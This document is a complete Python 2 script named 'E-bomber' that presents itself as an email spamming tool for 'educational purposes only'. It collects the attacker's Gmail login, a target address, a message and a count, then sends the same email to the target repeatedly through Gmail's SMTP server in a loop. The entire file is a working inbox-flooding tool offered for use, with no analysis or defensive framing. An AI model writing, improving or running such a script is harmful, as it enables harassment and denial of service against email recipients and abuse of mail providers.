#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            #################################################       '
print '            #                                               #       '
print '            #        Email spammper ( Spamming Tool )         #       '
print '            #                                               #       '
print '            #                  Version 2.0                  #       '
print '            #                                               #       '
print '            #           codded by : prabesh rai     #       '
print '            #                                               #       '
print '            #       Only for Educational Purposes !!        #       '
print '            #                                               #       '
print '            #################################################       '

print '                                                                   '


print '                                           '

print 'create a new gmail for attack'
print '    '
email = raw_input('Attacker Gmail Address : ')
print '             '
user = raw_input('write name : ')
print '      '
passwd = getpass.getpass('Password: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Message: ')

print '    '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n completed !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()